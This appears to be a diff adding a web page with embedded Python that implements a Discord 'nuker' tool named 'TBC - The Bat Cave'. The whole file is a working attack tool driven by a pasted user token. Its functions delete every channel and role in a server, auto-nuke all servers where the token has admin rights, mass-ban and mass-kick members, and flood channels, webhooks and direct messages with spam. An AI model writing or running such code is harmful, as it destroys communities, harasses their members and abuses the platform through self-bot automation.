@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TBC - The Bat Cave</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css" />
+    <script defer src="https://pyscript.net/latest/pyscript.js"></script>
+    <style>
+        body {
+            background-color: #000000;
+            color: #FF0000;
+            font-family: 'Courier New', monospace;
+        }
+        .btn-tbc {
+            background-color: #FF0000;
+            color: #000000;
+            transition: background-color 0.3s;
+        }
+        .btn-tbc:hover {
+            background-color: #CC0000;
+        }
+        #cli-input {
+            background-color: #1a1a1a;
+            border: 2px solid #FF0000;
+            color: #FF0000;
+        }
+        #cli-output {
+            background-color: #1a1a1a;
+            border: 2px solid #FF0000;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-start pt-10">
+    <h1 class="text-4xl font-bold uppercase tracking-wider mb-6">TBC - The Bat Cave</h1>
+    <div id="timer" class="text-2xl mb-4">Time Remaining: 1:00:00</div>
+    <div class="w-full max-w-5xl">
+        <input id="token" type="text" placeholder="Enter Discord Token" class="w-full p-2 mb-4 bg-gray-800 border-2 border-red-500 text-red-500 rounded">
+        <div id="status" class="text-center mb-4"></div>
+        
+        <!-- Dashboard Buttons -->
+        <div class="bg-gray-900 p-6 rounded-lg shadow-lg mb-6">
+            <h2 class="text-xl font-bold mb-4">Dashboard Controls</h2>
+            <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
+                <button pys-onClick="nuke_guild" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-bomb mr-2"></i>Nuke</button>
+                <button pys-onClick="auto_nuke" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-robot mr-2"></i>AutoNuke</button>
+                <button pys-onClick="mass_role_delete" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-user-slash mr-2"></i>RoleDel</button>
+                <button pys-onClick="mass_channel_delete" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-trash mr-2"></i>ChanDel</button>
+                <button pys-onClick="server_leave" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-sign-out-alt mr-2"></i>Leave</button>
+                <button pys-onClick="webhook_spam" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-globe mr-2"></i>Webhook</button>
+                <button pys-onClick="mass_channel_create" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-plus-circle mr-2"></i>ChanCre</button>
+                <button pys-onClick="mass_dm" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-envelope mr-2"></i>Mass DM</button>
+                <button pys-onClick="role_spam" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-users mr-2"></i>RoleSpam</button>
+                <button pys-onClick="channel_spam" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-comment-dots mr-2"></i>ChanSpam</button>
+                <button pys-onClick="mass_ban" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-ban mr-2"></i>Mass Ban</button>
+                <button pys-onClick="mass_kick" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-boot mr-2"></i>MassKick</button>
+                <button pys-onClick="mass_unban" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-undo mr-2"></i>MassUnbn</button>
+                <button pys-onClick="mass_role_assign" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-user-plus mr-2"></i>RoleAdd</button>
+                <button pys-onClick="mass_role_remove" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-user-minus mr-2"></i>RoleRem</button>
+                <button pys-onClick="guild_name_change" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-edit mr-2"></i>NameChg</button>
+                <button pys-onClick="mass_message_delete" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-eraser mr-2"></i>Msg Del</button>
+                <button pys-onClick="invite_create" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-link mr-2"></i>Inv Cre</button>
+                <button pys-onClick="webhook_create" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-hook mr-2"></i>Web Cre</button>
+                <button pys-onClick="webhook_delete" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-unlink mr-2"></i>Web Del</button>
+                <button pys-onClick="prune" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-cut mr-2"></i>Prune</button>
+                <button pys-onClick="scrape" class="btn-tbc p-2 rounded flex items-center justify-center"><i class="fas fa-search mr-2"></i>Scrape</button>
+            </div>
+        </div>
+
+        <!-- CLI Interface -->
+        <div class="bg-gray-900 p-6 rounded-lg shadow-lg">
+            <h2 class="text-xl font-bold mb-4">TBC CLI</h2>
+            <div id="cli-output" class="w-full p-2 mb-4 text-left text-red-500"></div>
+            <input id="cli-input" type="text" placeholder="Enter option (e.g., 1 for Nuke)" class="w-full p-2 rounded" pys-onKeyPress="handle_cli_input">
+        </div>
+    </div>
+
+    <py-config>
+        packages = ["httpx"]
+    </py-config>
+
+    <py-script>
+        import asyncio
+        import httpx
+        from js import document, window, setInterval, clearInterval, console
+        from pyodide.ffi import create_proxy
+        from datetime import datetime
+
+        # Timer setup
+        TRIAL_DURATION = 3600  # 1 hour in seconds
+        trial_end = window.performance.now() / 1000 + TRIAL_DURATION
+
+        def update_timer():
+            now = window.performance.now() / 1000
+            remaining = trial_end - now
+            if remaining <= 0:
+                clearInterval(timer_interval)
+                document.getElementById("timer").innerHTML = "Time's Up!"
+                window.location.href = "cooldown.html"
+            else:
+                minutes = int(remaining // 60)
+                seconds = int(remaining % 60)
+                document.getElementById("timer").innerHTML = f"Time Remaining: {minutes:02d}:{seconds:02d}"
+
+        timer_interval = setInterval(create_proxy(update_timer), 1000)
+
+        # Logging function
+        def log(message, level="INFO"):
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            cli_output = document.getElementById("cli-output")
+            cli_output.innerHTML += f"{timestamp} | {level} | {message}<br>"
+            cli_output.scrollTop = cli_output.scrollHeight
+
+        # Discord Client Class
+        class DiscordClient:
+            def __init__(self, token, is_bot=False):
+                self.token = token
+                self.is_bot = is_bot
+                self.headers = {"Authorization": f"Bot {token}" if is_bot else token, "Content-Type": "application/json"}
+                self.client = httpx.AsyncClient(http2=True, limits=httpx.Limits(max_connections=100))
+
+            async def close(self):
+                await self.client.aclose()
+
+            async def request(self, method, endpoint, **kwargs):
+                url = f"https://discord.com/api/v10{endpoint}"
+                for attempt in range(3):
+                    try:
+                        response = await self.client.request(method, url, headers=self.headers, **kwargs)
+                        response.raise_for_status()
+                        return response.json() if response.text else {}
+                    except httpx.HTTPStatusError as e:
+                        log(f"{method} {endpoint} failed: {e.response.status_code} {e.response.text}", "ERROR")
+                        if e.response.status_code == 429:
+                            retry_after = e.response.json().get("retry_after", 1)
+                            log(f"Rate limit hit. Retrying after {retry_after}s", "WARNING")
+                            await asyncio.sleep(retry_after)
+                            continue
+                        return None
+                    except httpx.RequestError as e:
+                        log(f"Network error on {method} {endpoint}: {str(e)}", "ERROR")
+                        return None
+                log(f"Failed {method} {endpoint} after 3 attempts", "ERROR")
+                return None
+
+        # TBC Manager Class
+        class TBCManager:
+            def __init__(self, token):
+                self.client = DiscordClient(token, is_bot=False)  # Assuming user token for simplicity
+                self.TBC_NAME = "tbc"
+                self.webhook_cache = {}
+
+            async def has_admin_permissions(self, guild_id):
+                guild = await self.client.request("GET", f"/guilds/{guild_id}")
+                if not guild:
+                    log(f"Failed to fetch guild {guild_id}", "ERROR")
+                    return False
+                permissions = int(guild.get("permissions", 0))
+                has_admin = (permissions & 0x8) == 0x8
+                log(f"Admin permissions for guild {guild_id}: {has_admin}", "INFO")
+                return has_admin
+
+            async def fetch_channel_ids(self, guild_id):
+                channels = await self.client.request("GET", f"/guilds/{guild_id}/channels") or []
+                text_channels = [c["id"] for c in channels if c["type"] in (0, 5)]
+                log(f"Fetched {len(text_channels)} channels in guild {guild_id}", "INFO")
+                return text_channels
+
+            async def fetch_member_ids(self, guild_id):
+                member_ids = []
+                after = None
+                while True:
+                    params = {"limit": 1000}
+                    if after:
+                        params["after"] = after
+                    members = await self.client.request("GET", f"/guilds/{guild_id}/members", params=params) or []
+                    if not members:
+                        break
+                    member_ids.extend(m["user"]["id"] for m in members)
+                    after = members[-1]["user"]["id"]
+                log(f"Fetched {len(member_ids)} member IDs from guild {guild_id}", "INFO")
+                return member_ids
+
+            async def fetch_webhooks(self, guild_id):
+                # Simplified for PyScript (no file system access)
+                webhooks = []
+                channel_ids = await self.fetch_channel_ids(guild_id)
+                for channel_id in channel_ids:
+                    wbs = await self.client.request("GET", f"/channels/{channel_id}/webhooks") or []
+                    for wb in wbs:
+                        if "token" in wb and "id" in wb:
+                            wb["url"] = f"https://discord.com/api/webhooks/{wb['id']}/{wb['token']}"
+                            webhooks.append(wb)
+                self.webhook_cache[guild_id] = webhooks
+                log(f"Fetched {len(webhooks)} webhooks in guild {guild_id}", "INFO")
+                return webhooks
+
+            async def webhook_create(self, guild_id):
+                has_admin = await self.has_admin_permissions(guild_id)
+                if not has_admin:
+                    log(f"No admin permissions in guild {guild_id}", "WARNING")
+                channel_ids = await self.fetch_channel_ids(guild_id)
+                tasks = [self.client.request("POST", f"/channels/{cid}/webhooks", json={"name": self.TBC_NAME}) for cid in channel_ids]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception) and r)
+                log(f"Created {success_count} webhooks in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def webhook_spam(self, guild_id, message, count):
+                webhooks = await self.fetch_webhooks(guild_id)
+                if not webhooks:
+                    log(f"No webhooks found in guild {guild_id}", "ERROR")
+                    return
+                tasks = [self.client.request("POST", wb["url"], json={"content": message}) for wb in webhooks for _ in range(count)]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Sent {success_count} messages to webhooks in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def nuke_guild(self, guild_id):
+                channel_ids = await self.fetch_channel_ids(guild_id)
+                tasks = [self.client.request("DELETE", f"/channels/{cid}") for cid in channel_ids]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Nuked guild {guild_id}: {success_count}/{len(channel_ids)} channels deleted", "SUCCESS" if success_count else "ERROR")
+
+            async def auto_nuke(self):
+                guilds = await self.client.request("GET", "/users/@me/guilds") or []
+                for guild in guilds:
+                    if int(guild.get("permissions", 0)) & 0x8:
+                        await self.nuke_guild(guild["id"])
+                log("Auto-nuke completed", "SUCCESS")
+
+            async def mass_role_delete(self, guild_id):
+                roles = await self.client.request("GET", f"/guilds/{guild_id}/roles") or []
+                tasks = [self.client.request("DELETE", f"/guilds/{guild_id}/roles/{r['id']}") for r in roles if not r["managed"]]
+                await asyncio.gather(*tasks)
+                log(f"Deleted all non-managed roles in guild {guild_id}", "SUCCESS")
+
+            async def mass_channel_delete(self, guild_id):
+                channel_ids = await self.fetch_channel_ids(guild_id)
+                tasks = [self.client.request("DELETE", f"/channels/{cid}") for cid in channel_ids]
+                await asyncio.gather(*tasks)
+                log(f"Deleted all channels in guild {guild_id}", "SUCCESS")
+
+            async def server_leave(self, guild_id):
+                if await self.client.request("DELETE", f"/users/@me/guilds/{guild_id}"):
+                    log(f"Left server {guild_id}", "SUCCESS")
+
+            async def mass_channel_create(self, guild_id, count):
+                tasks = [self.client.request("POST", f"/guilds/{guild_id}/channels", json={"name": self.TBC_NAME, "type": 0}) for _ in range(count)]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Created {success_count} channels in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def mass_dm(self, guild_id, message):
+                user_ids = await self.fetch_member_ids(guild_id)
+                tasks = []
+                for uid in user_ids:
+                    channel = await self.client.request("POST", "/users/@me/channels", json={"recipient_id": uid})
+                    if channel and "id" in channel:
+                        tasks.append(self.client.request("POST", f"/channels/{channel['id']}/messages", json={"content": message}))
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Sent DMs to {success_count} users in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def role_spam(self, guild_id, count):
+                tasks = [self.client.request("POST", f"/guilds/{guild_id}/roles", json={"name": self.TBC_NAME}) for _ in range(count)]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Created {success_count} roles in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def mass_ban(self, guild_id):
+                user_ids = await self.fetch_member_ids(guild_id)
+                tasks = [self.client.request("PUT", f"/guilds/{guild_id}/bans/{uid}", json={"delete_message_days": 7}) for uid in user_ids]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Banned {success_count} users in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def mass_kick(self, guild_id):
+                user_ids = await self.fetch_member_ids(guild_id)
+                tasks = [self.client.request("DELETE", f"/guilds/{guild_id}/members/{uid}") for uid in user_ids]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Kicked {success_count} users in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def mass_unban(self, guild_id):
+                bans = await self.client.request("GET", f"/guilds/{guild_id}/bans") or []
+                tasks = [self.client.request("DELETE", f"/guilds/{guild_id}/bans/{b['user']['id']}") for b in bans]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Unbanned {success_count} users in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def mass_role_assign(self, guild_id, role_id):
+                user_ids = await self.fetch_member_ids(guild_id)
+                tasks = [self.client.request("PUT", f"/guilds/{guild_id}/members/{uid}/roles/{role_id}") for uid in user_ids]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Assigned role {role_id} to {success_count} users in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def mass_role_remove(self, guild_id, role_id):
+                user_ids = await self.fetch_member_ids(guild_id)
+                tasks = [self.client.request("DELETE", f"/guilds/{guild_id}/members/{uid}/roles/{role_id}") for uid in user_ids]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Removed role {role_id} from {success_count} users in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def guild_name_change(self, guild_id, new_name):
+                if await self.client.request("PATCH", f"/guilds/{guild_id}", json={"name": new_name}):
+                    log(f"Changed guild name to {new_name}", "SUCCESS")
+
+            async def mass_message_delete(self, channel_id, count):
+                messages = await self.client.request("GET", f"/channels/{channel_id}/messages", params={"limit": count}) or []
+                tasks = [self.client.request("DELETE", f"/channels/{channel_id}/messages/{m['id']}") for m in messages]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Deleted {success_count} messages in channel {channel_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def invite_create(self, channel_id):
+                invite = await self.client.request("POST", f"/channels/{channel_id}/invites", json={"max_uses": 0, "max_age": 0})
+                if invite and "code" in invite:
+                    log(f"Created invite: discord.gg/{invite['code']}", "SUCCESS")
+                    return f"discord.gg/{invite['code']}"
+                log(f"Failed to create invite in channel {channel_id}", "ERROR")
+
+            async def webhook_delete(self, guild_id):
+                webhooks = await self.fetch_webhooks(guild_id)
+                tasks = [self.client.request("DELETE", f"/webhooks/{wb['id']}") for wb in webhooks]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Deleted {success_count} webhooks in guild {guild_id}", "SUCCESS" if success_count else "ERROR")
+                self.webhook_cache[guild_id] = []
+
+            async def channel_spam(self, channel_id, message, count):
+                tasks = [self.client.request("POST", f"/channels/{channel_id}/messages", json={"content": message}) for _ in range(count)]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in results if not isinstance(r, Exception))
+                log(f"Sent {success_count} messages to channel {channel_id}", "SUCCESS" if success_count else "ERROR")
+
+            async def prune(self, guild_id, days):
+                if await self.client.request("POST", f"/guilds/{guild_id}/prune", json={"days": days}):
+                    log(f"Pruned members inactive for {days} days in guild {guild_id}", "SUCCESS")
+                else:
+                    log(f"Failed to prune members in guild {guild_id}", "ERROR")
+
+            async def scrape(self, guild_id):
+                members = await self.client.request("GET", f"/guilds/{guild_id}/members", params={"limit": 1000}) or []
+                channels = await self.client.request("GET", f"/guilds/{guild_id}/channels") or []
+                member_ids = [m["user"]["id"] for m in members]
+                channel_ids = [c["id"] for c in channels if c["type"] in (0, 5)]
+                log(f"Scraped {len(member_ids)} members and {len(channel_ids)} channels (stored in memory)", "SUCCESS")
+                # No file system in PyScript, so just log
+
+        manager = None
+
+        def get_manager():
+            global manager
+            if not manager:
+                token = document.getElementById("token").value
+                if not token:
+                    log("Please enter a Discord token!", "ERROR")
+                    return None
+                manager = TBCManager(token)
+                log(f"Initialized TBC with token", "SUCCESS")
+            return manager
+
+        # Button Handlers
+        async def nuke_guild(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.nuke_guild(guild_id)
+
+        async def auto_nuke(*args):
+            mgr = get_manager()
+            if mgr:
+                await mgr.auto_nuke()
+
+        async def mass_role_delete(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.mass_role_delete(guild_id)
+
+        async def mass_channel_delete(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.mass_channel_delete(guild_id)
+
+        async def server_leave(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.server_leave(guild_id)
+
+        async def webhook_spam(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                message = window.prompt("Enter Message:")
+                count = int(window.prompt("Enter Count:"))
+                if guild_id and message and count:
+                    await mgr.webhook_spam(guild_id, message, count)
+
+        async def mass_channel_create(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                count = int(window.prompt("Enter Count:"))
+                if guild_id and count:
+                    await mgr.mass_channel_create(guild_id, count)
+
+        async def mass_dm(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                message = window.prompt("Enter Message:")
+                if guild_id and message:
+                    await mgr.mass_dm(guild_id, message)
+
+        async def role_spam(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                count = int(window.prompt("Enter Count:"))
+                if guild_id and count:
+                    await mgr.role_spam(guild_id, count)
+
+        async def mass_ban(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.mass_ban(guild_id)
+
+        async def mass_kick(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.mass_kick(guild_id)
+
+        async def mass_unban(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.mass_unban(guild_id)
+
+        async def mass_role_assign(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                role_id = window.prompt("Enter Role ID:")
+                if guild_id and role_id:
+                    await mgr.mass_role_assign(guild_id, role_id)
+
+        async def mass_role_remove(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                role_id = window.prompt("Enter Role ID:")
+                if guild_id and role_id:
+                    await mgr.mass_role_remove(guild_id, role_id)
+
+        async def guild_name_change(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                new_name = window.prompt("Enter New Name:")
+                if guild_id and new_name:
+                    await mgr.guild_name_change(guild_id, new_name)
+
+        async def mass_message_delete(*args):
+            mgr = get_manager()
+            if mgr:
+                channel_id = window.prompt("Enter Channel ID:")
+                count = int(window.prompt("Enter Count:"))
+                if channel_id and count:
+                    await mgr.mass_message_delete(channel_id, count)
+
+        async def invite_create(*args):
+            mgr = get_manager()
+            if mgr:
+                channel_id = window.prompt("Enter Channel ID:")
+                if channel_id:
+                    await mgr.invite_create(channel_id)
+
+        async def webhook_create(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.webhook_create(guild_id)
+
+        async def webhook_delete(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.webhook_delete(guild_id)
+
+        async def channel_spam(*args):
+            mgr = get_manager()
+            if mgr:
+                channel_id = window.prompt("Enter Channel ID:")
+                message = window.prompt("Enter Message:")
+                count = int(window.prompt("Enter Count:"))
+                if channel_id and message and count:
+                    await mgr.channel_spam(channel_id, message, count)
+
+        async def prune(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                days = int(window.prompt("Enter Days:"))
+                if guild_id and days:
+                    await mgr.prune(guild_id, days)
+
+        async def scrape(*args):
+            mgr = get_manager()
+            if mgr:
+                guild_id = window.prompt("Enter Guild ID:")
+                if guild_id:
+                    await mgr.scrape(guild_id)
+
+        # CLI Handler
+        async def handle_cli_input(event):
+            if event.key == "Enter":
+                choice = document.getElementById("cli-input").value.strip()
+                document.getElementById("cli-input").value = ""
+                mgr = get_manager()
+                if not mgr:
+                    return
+
+                actions = {
+                    "1": lambda: mgr.nuke_guild(window.prompt("Guild ID: ")),
+                    "2": lambda: mgr.auto_nuke(),
+                    "3": lambda: mgr.mass_role_delete(window.prompt("Guild ID: ")),
+                    "4": lambda: mgr.mass_channel_delete(window.prompt("Guild ID: ")),
+                    "5": lambda: mgr.server_leave(window.prompt("Guild ID: ")),
+                    "6": lambda: mgr.webhook_spam(window.prompt("Guild ID: "), window.prompt("Message: "), int(window.prompt("Count: "))),
+                    "7": lambda: mgr.mass_channel_create(window.prompt("Guild ID: "), int(window.prompt("Count: "))),
+                    "8": lambda: mgr.mass_dm(window.prompt("Guild ID: "), window.prompt("Message: ")),
+                    "9": lambda: mgr.role_spam(window.prompt("Guild ID: "), int(window.prompt("Count: "))),
+                    "10": lambda: mgr.mass_ban(window.prompt("Guild ID: ")),
+                    "11": lambda: mgr.mass_kick(window.prompt("Guild ID: ")),
+                    "12": lambda: mgr.mass_unban(window.prompt("Guild ID: ")),
+                    "13": lambda: mgr.mass_role_assign(window.prompt("Guild ID: "), window.prompt("Role ID: ")),
+                    "14": lambda: mgr.mass_role_remove(window.prompt("Guild ID: "), window.prompt("Role ID: ")),
+                    "15": lambda: mgr.guild_name_change(window.prompt("Guild ID: "), window.prompt("New Name: ")),
+                    "16": lambda: mgr.mass_message_delete(window.prompt("Channel ID: "), int(window.prompt("Count: "))),
+                    "17": lambda: mgr.invite_create(window.prompt("Channel ID: ")),
+                    "18": lambda: mgr.webhook_create(window.prompt("Guild ID: ")),
+                    "19": lambda: mgr.prune(window.prompt("Guild ID: "), int(window.prompt("Days: "))),
+                    "20": lambda: mgr.scrape(window.prompt("Guild ID: ")),
+                    "23": lambda: mgr.channel_spam(window.prompt("Channel ID: "), window.prompt("Message: "), int(window.prompt("Count: "))),
+                    "24": lambda: mgr.webhook_delete(window.prompt("Guild ID: ")),
+                    "21": lambda: log("Exiting not supported in web", "INFO")
+                }
+                if choice in actions:
+                    await actions[choice]()
+                else:
+                    log(f"Invalid option: {choice}", "ERROR")
+
+        # Expose functions to JavaScript
+        document.nuke_guild = create_proxy(nuke_guild)
+        document.auto_nuke = create_proxy(auto_nuke)
+        document.mass_role_delete = create_proxy(mass_role_delete)
+        document.mass_channel_delete = create_proxy(mass_channel_delete)
+        document.server_leave = create_proxy(server_leave)
+        document.webhook_spam = create_proxy(webhook_spam)
+        document.mass_channel_create = create_proxy(mass_channel_create)
+        document.mass_dm = create_proxy(mass_dm)
+        document.role_spam = create_proxy(role_spam)
+        document.mass_ban = create_proxy(mass_ban)
+        document.mass_kick = create_proxy(mass_kick)
+        document.mass_unban = create_proxy(mass_unban)
+        document.mass_role_assign = create_proxy(mass_role_assign)
+        document.mass_role_remove = create_proxy(mass_role_remove)
+        document.guild_name_change = create_proxy(guild_name_change)
+        document.mass_message_delete = create_proxy(mass_message_delete)
+        document.invite_create = create_proxy(invite_create)
+        document.webhook_create = create_proxy(webhook_create)
+        document.webhook_delete = create_proxy(webhook_delete)
+        document.channel_spam = create_proxy(channel_spam)
+        document.prune = create_proxy(prune)
+        document.scrape = create_proxy(scrape)
+        document.handle_cli_input = create_proxy(handle_cli_input)
+    </py-script>
+</body>
+</html>
